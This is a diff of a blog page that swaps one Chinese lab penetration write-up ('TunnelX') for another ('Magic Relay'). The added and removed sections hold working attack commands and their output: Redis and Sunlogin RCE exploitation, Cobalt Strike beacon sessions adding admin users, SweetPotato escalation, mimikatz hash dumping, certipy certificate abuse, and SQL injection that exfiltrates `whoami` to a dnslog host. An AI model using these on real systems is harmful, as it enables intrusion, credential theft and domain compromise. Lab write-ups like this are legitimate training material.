@@ -4,11 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="TunnelX, q1n9&#39;s blog">
-    <meta name="description" content="39.98.121.198
-TunnelXflag02
-第1关
-请测试暴露在公网上的 Web 应用的安全性，并尝试获取目标数据库权限。 第2关由于处于一个封闭的内网环境。搭建好特定的隧道，对目标内网展开信息收集。 第3关寻找到主机上的薄弱点">
+    <meta name="keywords" content="Magic Relay, q1n9&#39;s blog">
+    <meta name="description" content="shell C:\Users\xianxin\Desktop\SharpHound.exe -c all –outputdirectory C:\Users\Public\39.99.139.56
+Magic Relayflag01┌──(">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +18,7 @@ TunnelXflag02
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>TunnelX | q1n9&#39;s blog</title>
+    <title>Magic Relay | q1n9&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -337,12 +335,12 @@ TunnelXflag02
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">TunnelX</h1>
+                    <h1 class="description center-align post-title">Magic Relay</h1>
                 </div>
             </div>
         </div>
@@ -395,28 +393,28 @@ TunnelXflag02
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2026-02-06
+                    2026-02-15
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2026-02-06
+                    2026-02-15
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.5k
+                    3.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    13 分
+                    18 分
                 </div>
                 
 
@@ -439,13 +437,9 @@ TunnelXflag02
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>39.98.121.198</p>
-<h1 id="TunnelX"><a href="#TunnelX" class="headerlink" title="TunnelX"></a>TunnelX</h1><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><blockquote>
-<p>第1关</p>
-<p>请测试暴露在公网上的 Web 应用的安全性，并尝试获取目标数据库权限。<br> 第2关<br>由于处于一个封闭的内网环境。搭建好特定的隧道，对目标内网展开信息收集。<br> 第3关<br>寻找到主机上的薄弱点，尝试将权限提升至SYSTEM。<br> 第4关<br>发现域控制器所存在的漏洞，尝试获取域内管理员权限。</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~/桌面/tools/tools/fscan_all_version]
-└─$ ./fscan -h 39.98.121.198
+                <p>shell C:\Users\xianxin\Desktop\SharpHound.exe -c all –outputdirectory C:\Users\Public\39.99.139.56</p>
+<h1 id="Magic-Relay"><a href="#Magic-Relay" class="headerlink" title="Magic Relay"></a>Magic Relay</h1><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~/桌面/tools/tools/fscan_all_version]
+└─$ ./fscan -h 39.99.139.56           
 
    ___                              _    
   / _ \     ___  ___ _ __ __ _  ___| | __ 
@@ -454,18 +448,39 @@ TunnelXflag02
 \____/     |___/\___|_|  \__,_|\___|_|\_\   
                      fscan version: 1.8.4
 start infoscan
-39.98.121.198:80 open
+39.99.139.56:6379 open
 Open result.txt error, open result.txt: permission denied
 [*] alive ports len is: 1
 start vulscan
-[*] WebTitle http://39.98.121.198      code:200 len:24977  title:Zosimos
-Open result.txt error, open result.txt: permission denied
+[+] Redis 39.99.139.56:6379 unauthorized file:C:\Program Files\Redis/dump.rdb
+Open result.txt error, open result.txt: permission denied                                                                                                                                                         
 已完成 1/1
-[*] 扫描结束,耗时: 9.395559347s
+[*] 扫描结束,耗时: 10.115212712s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-──(kali㉿kali)-[~/桌面/tools/tools/fscan_all_version]
-└─$ sudo ./fscan -h 39.98.121.198 -p 1-65535
+<p>通过MDUT可以发现是windows</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sup3rman/p/16803408.html">Windows中redis未授权通过dll劫持上线 - 我要变超人 - 博客园</a></p>
+<p>学长弄好了嘿嘿（）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/67a9f650080fcd09474b3f98088bdf9a.png"></p>
+<hr>
+<h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><p>可以rdq上去更好操作</p>
+<pre class="line-numbers language-none"><code class="language-none">[02/15 17:05:59] beacon&gt; shell net user matrix4 pass@123 /add
+[02/15 17:05:59] [*] Tasked beacon to run: net user matrix4 pass@123 /add
+[02/15 17:05:59] [+] host called home, sent: 61 bytes
+[02/15 17:05:59] [+] received output:
+命令成功完成。
 
+
+[02/15 17:06:11] beacon&gt; shell net localgroup Administrators matrix4 /add
+[02/15 17:06:11] [*] Tasked beacon to run: net localgroup Administrators matrix4 /add
+[02/15 17:06:11] [+] host called home, sent: 73 bytes
+[02/15 17:06:11] [+] received output:
+命令成功完成。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">shell C:\Users\xianxin\Desktop\fscan.exe -h 172.22.12.0/24 -nobr
+[02/15 17:26:34] [*] Tasked beacon to run: C:\Users\xianxin\Desktop\fscan.exe -h 172.22.12.0/24 -nobr
+[02/15 17:26:34] [+] host called home, sent: 89 bytes
+[02/15 17:26:44] [+] received output:
 
    ___                              _    
   / _ \     ___  ___ _ __ __ _  ___| | __ 
@@ -474,304 +489,412 @@ Open result.txt error, open result.txt: permission denied
 \____/     |___/\___|_|  \__,_|\___|_|\_\   
                      fscan version: 1.8.4
 start infoscan
-39.98.121.198:80 open
-39.98.121.198:2121 open（FTP默认端口 21，此处为非标准）
-39.98.121.198:3389 open
-39.98.121.198:47001 open
-39.98.121.198:49666 open
-39.98.121.198:49665 open
-39.98.121.198:49668 open
-39.98.121.198:49667 open
-39.98.121.198:49669 open
-39.98.121.198:49664 open
-39.98.121.198:49675 open
-39.98.121.198:49677 open
-[*] alive ports len is: 12
+(icmp) Target 172.22.12.6     is alive
+(icmp) Target 172.22.12.12    is alive
+(icmp) Target 172.22.12.25    is alive
+(icmp) Target 172.22.12.31    is alive
+[*] Icmp alive hosts len is: 4
+172.22.12.6:88 open
+172.22.12.25:6379 open
+172.22.12.31:445 open
+172.22.12.12:445 open
+172.22.12.25:445 open
+172.22.12.6:445 open
+172.22.12.31:139 open
+172.22.12.12:139 open
+172.22.12.25:139 open
+172.22.12.6:139 open
+172.22.12.31:135 open
+172.22.12.25:135 open
+172.22.12.12:135 open
+172.22.12.6:135 open
+172.22.12.31:80 open
+172.22.12.12:80 open
+172.22.12.31:21 open
+[*] alive ports len is: 17
 start vulscan
-[*] WebTitle http://39.98.121.198      code:200 len:24977  title:Zosimos
-[*] WebTitle http://39.98.121.198:47001 code:404 len:315    title:Not Found
-已完成 11/12 [-] (52/210) rdp 39.98.121.198:3389 administrator Aa1234 remote error: tls: access denied 
-已完成 11/12 [-] (104/210) rdp 39.98.121.198:3389 admin 123qwe remote error: tls: access denied 
-已完成 11/12 [-] (156/210) rdp 39.98.121.198:3389 guest admin123!@# remote error: tls: access denied 
-已完成 11/12 [-] (208/210) rdp 39.98.121.198:3389 guest 1q2w3e remote error: tls: access denied 
-已完成 12/12
-[*] 扫描结束,耗时: 8m14.375625254s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+[*] NetInfo 
+[*]172.22.12.25
+   [-&gt;]WIN-YUYAOX9Q
+   [-&gt;]172.22.12.25
+[*] NetInfo 
+[*]172.22.12.6
+   [-&gt;]WIN-SERVER
+   [-&gt;]172.22.12.6
+[*] NetInfo 
+[*]172.22.12.12
+   [-&gt;]WIN-AUTHORITY
+   [-&gt;]172.22.12.12
+[*] WebTitle http://172.22.12.12       code:200 len:703    title:IIS Windows Server
+[*] NetBios 172.22.12.31    WORKGROUP\WIN-IISQE3PC        
+[*] NetInfo 
+[*]172.22.12.31
+   [-&gt;]WIN-IISQE3PC
+   [-&gt;]172.22.12.31
+[*] WebTitle http://172.22.12.31       code:200 len:703    title:IIS Windows Server
+[*] NetBios 172.22.12.6     [+] DC:WIN-SERVER.xiaorang.lab       Windows Server 2016 Standard 14393
+[*] NetBios 172.22.12.12    WIN-AUTHORITY.xiaorang.lab          Windows Server 2016 Datacenter 14393
+[+] PocScan http://172.22.12.12 poc-yaml-active-directory-certsrv-detect 
 
-<table>
-<thead>
-<tr>
-<th>47001、49xxx</th>
-<th>Windows RPC/DCOM 端口</th>
-<th>系统默认服务端口，无明显漏洞特征，需结合系统版本判断</th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<p>2121端口有ftp匿名登陆，有个secret.7z，但需要密码</p>
-<p>先将<code>secret.7z</code>转换为john格式，然后再用john去爆破密码</p>
-<blockquote>
-<p>遇到报错一般需要装一下依赖（我没遇到）</p>
-<pre class="line-numbers language-none"><code class="language-none">su
-apt install liblzma-dev
-apt-get install cpanminus
-cpan Compress::Raw::Lzma<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote>
-<pre class="line-numbers language-none"><code class="language-none">7z2john secret.7z &gt;1.txt
-john 1.txt --wordlist=/usr/share/wordlists/rockyou.txt
-john 1.txt --wordlist=./rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+[02/15 17:26:45] [+] received output:
+[+] Redis 172.22.12.25:6379 unauthorized file:C:\Program Files\Redis/dump.rdb
 
-<p>爆出密码<code>13131313</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/b2b7a42fe1899c48140d8315166b8e9f.png"></p>
-<p>得到</p>
-<pre class="line-numbers language-none"><code class="language-none">A strange character string, You're the only one I'm telling
-e7d41890-5742-48f0-9f3c-1393db541fc7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+[02/15 17:26:49] [+] received output:
+宸插畬鎴� 17/17
+[*] 鎵弿缁撴潫,鑰楁椂: 14.3681818s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<blockquote>
-<p>这东西其实就是一个sscms的api-key：<a target="_blank" rel="noopener" href="https://sscms.com/docs/v6/api/guide/authentication.html#%E8%8E%B7%E5%8F%96-api-%E5%AF%86%E9%92%A5">API 身份认证</a>，有这东西就能直接访问后台的接口了，也能直接sql注入了，因为那个后台洞其实就是注入的/api/pages/cms/libraryText/list</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~]
-└─$ ftp anonymous@39.98.121.198 2121
-Connected to 39.98.121.198.
+<ul>
+<li><code>172.22.12.31</code> WIN-IISQE3PC，有向日葵</li>
+<li><code>172.22.12.6</code> WIN-SERVER，DC</li>
+<li><code>172.22.12.25</code> WIN-YUYAOX9Q，有redis</li>
+<li><code>172.22.12.12</code> WIN-AUTHORITY，有AD CS</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">                                                                                                                                                                                           
+┌──(kali㉿kali)-[~]
+└─$  proxychains ftp 172.22.12.31
+
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  47.94.74.23:12346  ...  172.22.12.31:21  ...  OK
+Connected to 172.22.12.31.
 220 Microsoft FTP Service
+Name (172.22.12.31:kali): anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
 Password: 
 230 User logged in.
 Remote system type is Windows_NT.
 ftp&gt; ls
-229 Entering Extended Passive Mode (|||50255|)
+229 Entering Extended Passive Mode (|||50286|)
+[proxychains] Strict chain  ...  47.94.74.23:12346  ...  172.22.12.31:50286  ...  OK
 125 Data connection already open; Transfer starting.
--rwxrwxrwx   1 owner    group             315 Sep 11  2023 secret.7z
-226 Transfer complete.
-ftp&gt; get secret.7z
-local: secret.7z remote: secret.7z
-229 Entering Extended Passive Mode (|||50256|)
-125 Data connection already open; Transfer starting.
-100% |*********************************************************************************************************************************************************************|   315        4.44 KiB/s    00:00 ETA
-226 Transfer complete.
-WARNING! 2 bare linefeeds received in ASCII mode.
-File may not have transferred correctly.
-315 bytes received in 00:00 (4.41 KiB/s)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+01-06-25  01:48PM             14692880 SunloginClient_11.0.0.33826_x64.exe
 
-<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f03839137dcd281b92ee5d925b3fe138.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0cc3f5dd5409edef75480720af6938f6.png"></p>
-<p>而且搜 6.15.51漏洞，也能发现为<code>SiteServer CMS v16.5</code></p>
-<p>存在cve：<a target="_blank" rel="noopener" href="https://github.com/siteserver/cms/issues/3237">https://github.com/siteserver/cms/issues/3237</a></p>
-<p>用这个脚本</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/datouo/TunnelX/blob/master/udf-dnscat.py">TunnelX/udf-dnscat.py at master · datouo/TunnelX</a></p>
-<p>跑完后再发包就行</p>
-<pre class="line-numbers language-none"><code class="language-none">POST /api/pages/cms/libraryText/list HTTP/1.1
-Host: 39.98.121.198
-X-SS-API-KEY: e7d41890-5742-48f0-9f3c-1393db541fc7
-Content-Type: application/json
-Content-Length: 127
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-{"siteId":1,"keyword":"' and 1=(select @@Version)--","groupId":0,"page":1,"perPage":24}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个版本有漏洞<a target="_blank" rel="noopener" href="https://github.com/Mr-xn/sunlogin_rce">Mr-xn/sunlogin_rce: 向日葵 RCE</a></p>
+<pre class="line-numbers language-none"><code class="language-none">execute -f -c C:\Users\xianxin\Desktop\xrkRce.exe -h 172.22.12.31 -t scan
+[02/15 17:33:20] [*] Tasked beacon to execute: -f -c C:\Users\xianxin\Desktop\xrkRce.exe -h 172.22.12.31 -t scan
+[02/15 17:33:20] [+] host called home, sent: 97 bytes
+[02/15 17:33:20] [-] could not spawn -f -c C:\Users\xianxin\Desktop\xrkRce.exe -h 172.22.12.31 -t scan: 2 - ERROR_FILE_NOT_FOUND
+[02/15 17:33:25] [+] received output:
+[Info] 鐩爣鍙兘瀛樺湪Rce!绔彛: 49689
 
-<pre class="line-numbers language-none"><code class="language-none">POST /api/pages/cms/libraryText/list HTTP/1.1
-Host: 39.98.121.198
-X-SS-API-KEY: e7d41890-5742-48f0-9f3c-1393db541fc7
-Content-Type: application/json
-Content-Length: 127
+[02/15 17:33:31] [+] received output:
+鑺辫垂鏃堕棿涓�: 1m40.6732783s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-{"siteId":1,"keyword":"';select sys_eval('curl `whoami`.bbcocf.dnslog.cn')-- ","groupId":0,"page":1,"perPage":24}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>有点乱码，看了看是向日葵rce49689，so</p>
+<pre class="line-numbers language-none"><code class="language-none">shell C:\Users\xianxin\Desktop\xrkRce.exe -h 172.22.12.31  -t rce -p 49689 -c "net user matrix5 admin@123 /add"
+shell C:\Users\xianxin\Desktop\xrkRce.exe -h 172.22.12.31  -t rce -p 49689 -c "net localgroup administrators matrix5 /add"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="C:/Users/16256/AppData/Roaming/Typora/typora-user-images/image-20251106165334441.png" alt="image-20251106165334441"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ed12c2d2fc5106d2b557e180706786fa.png"></p>
+<p>然后rdq</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains xfreerdp /u:matrix5 /p:admin@123 /v:172.22.12.31 /cert:ignore<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="C:/Users/16256/AppData/Roaming/Typora/typora-user-images/image-20260215174339632.png" alt="image-20260215174339632"></p>
 <hr>
-<p>后面要用域名，就算了</p>
-<hr>
-<h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><p>(感谢学长为我们搭vps代理)</p>
-<p>改一下proxychains配置即可</p>
-<pre class="line-numbers language-none"><code class="language-none">proxychains4 curl 172.22.61.50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h3><pre class="line-numbers language-none"><code class="language-none">[02/15 17:50:14] beacon&gt; shell whoami /priv
+[02/15 17:50:14] [*] Tasked beacon to run: whoami /priv
+[02/15 17:50:14] [+] host called home, sent: 43 bytes
+[02/15 17:50:14] [+] received output:
 
-<p>DC的ldap匿名访问</p>
-<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~]
-└─# proxychains ldapsearch -H ldap://172.22.61.17 -b "DC=xiaorang,DC=lab" -x|grep ',CN=Users,DC=xiaorang,DC=lab'
+特权信息
+----------------------
+
+特权名                                    描述                               状态  
+========================================= ================================== ======
+SeIncreaseQuotaPrivilege                  为进程调整内存配额                 已禁用
+SeSecurityPrivilege                       管理审核和安全日志                 已禁用
+SeTakeOwnershipPrivilege                  取得文件或其他对象的所有权         已禁用
+SeLoadDriverPrivilege                     加载和卸载设备驱动程序             已禁用
+SeSystemProfilePrivilege                  配置文件系统性能                   已禁用
+SeSystemtimePrivilege                     更改系统时间                       已禁用
+SeProfileSingleProcessPrivilege           配置文件单一进程                   已禁用
+SeIncreaseBasePriorityPrivilege           提高计划优先级                     已禁用
+SeCreatePagefilePrivilege                 创建一个页面文件                   已禁用
+SeBackupPrivilege                         备份文件和目录                     已禁用
+SeRestorePrivilege                        还原文件和目录                     已禁用
+SeShutdownPrivilege                       关闭系统                           已禁用
+SeDebugPrivilege                          调试程序                           已禁用
+SeSystemEnvironmentPrivilege              修改固件环境值                     已禁用
+SeChangeNotifyPrivilege                   绕过遍历检查                       已启用
+SeRemoteShutdownPrivilege                 从远程系统强制关机                 已禁用
+SeUndockPrivilege                         从扩展坞上取下计算机               已禁用
+SeManageVolumePrivilege                   执行卷维护任务                     已禁用
+SeImpersonatePrivilege                    身份验证后模拟客户端               已启用
+SeCreateGlobalPrivilege                   创建全局对象                       已启用
+SeIncreaseWorkingSetPrivilege             增加进程工作集                     已禁用
+SeTimeZonePrivilege                       更改时区                           已禁用
+SeCreateSymbolicLinkPrivilege             创建符号链接                       已禁用
+SeDelegateSessionUserImpersonatePrivilege 获取同一会话中另一个用户的模拟令牌 已禁用
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>发现身份验证号模拟客户端启用，可以用sweetpotato提权</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/cb8662613786aeb5bb47eda292539994.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">shell C:\Users\xianxin\Desktop\SweetPotato.exe -a "C:\Users\xianxin\Desktop\artifact_x64.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4b94229aad329b2e9d492e7d033c9222.png"></p>
+<p>传猕猴桃抓hash</p>
+<pre class="line-numbers language-none"><code class="language-none">shell C:\Users\xianxin\Desktop\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
+v :	
+ [00000003] Primary
+ * Username : WIN-YUYAOX9Q$
+ * Domain   : XIAORANG
+ * NTLM     : e611213c6a712f9b18a8d056005a4f0f
+ * SHA1     : 1a8d2c95320592037c0fa583c1f62212d4ff8ce9
+tspkg :	
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">shell C:\Users\xianxin\Desktop\SharpHound.exe -c all --outputdirectory C:\Users\Public\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7e91ac19c1e8cb6683b85d1de9bab5c3.png"></p>
+<p>WIN-YUYAOX9Q单独出来的，和其他机器没有什么联系，但是存在CA服务器</p>
+<pre class="line-numbers language-none"><code class="language-none">[02/15 18:22:13] beacon&gt; shell certutil
+[02/15 18:22:13] [*] Tasked beacon to run: certutil
+[02/15 18:22:17] [+] host called home, sent: 39 bytes
+[02/15 18:22:17] [+] received output:
+项 0:
+  名称:                   	"xiaorang-WIN-AUTHORITY-CA"
+  部门:                   	""
+  单位:                   	""
+  区域:                   	""
+  省/自治区:              	""
+  国家/地区:              	""
+  配置:                   	"WIN-AUTHORITY.xiaorang.lab\xiaorang-WIN-AUTHORITY-CA"
+  Exchange 证书:          	""
+  签名证书:               	""
+  描述:                   	""
+  服务器:                 	"WIN-AUTHORITY.xiaorang.lab"
+  颁发机构:               	"xiaorang-WIN-AUTHORITY-CA"
+  净化的名称:             	"xiaorang-WIN-AUTHORITY-CA"
+  短名称:                 	"xiaorang-WIN-AUTHORITY-CA"
+  净化的短名称:           	"xiaorang-WIN-AUTHORITY-CA"
+  标记:                   	"1"
+  Web 注册服务器:         	""
+CertUtil: -dump 命令成功完成。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所以配置hosts</p>
+<pre class="line-numbers language-none"><code class="language-none">#/etc/hosts
+172.22.12.6 WIN-SERVER.xiaorang.lab
+172.22.12.12 xiaorang-WIN-AUTHORITY-CA
+172.22.12.6 xiaorang.lab
+172.22.12.12 WIN-AUTHORITY.xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>利用<code>WIN-YUYAOX9Q$</code> 机器用户新建一个机器用户，此机器账号用于冒充域管</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~]
+└─$ proxychains -q certipy-ad --debug account create -u WIN-YUYAOX9Q$ -hashes e611213c6a712f9b18a8d056005a4f0f -dc-ip 172.22.12.6 -user goudan -dns WIN-SERVER.xiaorang.lab
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
+[+] Nameserver: '172.22.12.6'
+[+] DC IP: '172.22.12.6'
+[+] DC Host: ''
+[+] Target IP: '172.22.12.6'
+[+] Remote Name: '172.22.12.6'
+[+] Domain: ''
+[+] Username: 'WIN-YUYAOX9Q$'
+[+] Authenticating to LDAP server using NTLM authentication
+[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
+[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
+[+] Using LDAP channel binding for NTLM authentication
+[+] LDAP NTLM authentication successful
+[+] Bound to ldaps://172.22.12.6:636 - ssl
+[+] Default path: DC=xiaorang,DC=lab
+[+] Configuration path: CN=Configuration,DC=xiaorang,DC=lab
+[*] Creating new account:
+    sAMAccountName                      : goudan$
+    unicodePwd                          : ljR0qkhFryHG7qP8
+    userAccountControl                  : 4096
+    servicePrincipalName                : HOST/goudan
+                                          RestrictedKrbHost/goudan
+    dnsHostName                         : WIN-SERVER.xiaorang.lab
+[*] Successfully created account 'goudan$' with password 'ljR0qkhFryHG7qP8'
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后使用创建好的机器账号申请一个证书</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~]
+└─$ proxychains certipy-ad --debug req -u 'goudan$@xiaorang.lab' -p 'ljR0qkhFryHG7qP8' -ca 'xiaorang-WIN-AUTHORITY-CA' -target 172.22.12.12 -template 'Machine' -dc-ip 172.22.12.6
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:389  ...  OK
-dn: CN=Administrator,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Guest,CN=Users,DC=xiaorang,DC=lab
-distinguishedName: CN=Guest,CN=Users,DC=xiaorang,DC=lab
-dn: CN=DefaultAccount,CN=Users,DC=xiaorang,DC=lab
-dn: CN=krbtgt,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Domain Computers,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Domain Controllers,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Schema Admins,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Enterprise Admins,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Cert Publishers,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Domain Admins,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Domain Users,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Domain Guests,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Group Policy Creator Owners,CN=Users,DC=xiaorang,DC=lab
-dn: CN=RAS and IAS Servers,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Denied RODC Password Replication Group,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Read-only Domain Controllers,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Cloneable Domain Controllers,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Protected Users,CN=Users,DC=xiaorang,DC=lab
-distinguishedName: CN=Protected Users,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Key Admins,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Enterprise Key Admins,CN=Users,DC=xiaorang,DC=lab
-dn: CN=DnsAdmins,CN=Users,DC=xiaorang,DC=lab
-distinguishedName: CN=DnsAdmins,CN=Users,DC=xiaorang,DC=lab
-dn: CN=DnsUpdateProxy,CN=Users,DC=xiaorang,DC=lab
-dn: CN=wangmei,CN=Users,DC=xiaorang,DC=lab
-distinguishedName: CN=wangmei,CN=Users,DC=xiaorang,DC=lab
-dn: CN=zhangjing,CN=Users,DC=xiaorang,DC=lab
-dn: CN=wangyong,CN=Users,DC=xiaorang,DC=lab
-dn: CN=huangyong,CN=Users,DC=xiaorang,DC=lab
-dn: CN=lixiang,CN=Users,DC=xiaorang,DC=lab
-dn: CN=chenlei,CN=Users,DC=xiaorang,DC=lab
-distinguishedName: CN=chenlei,CN=Users,DC=xiaorang,DC=lab
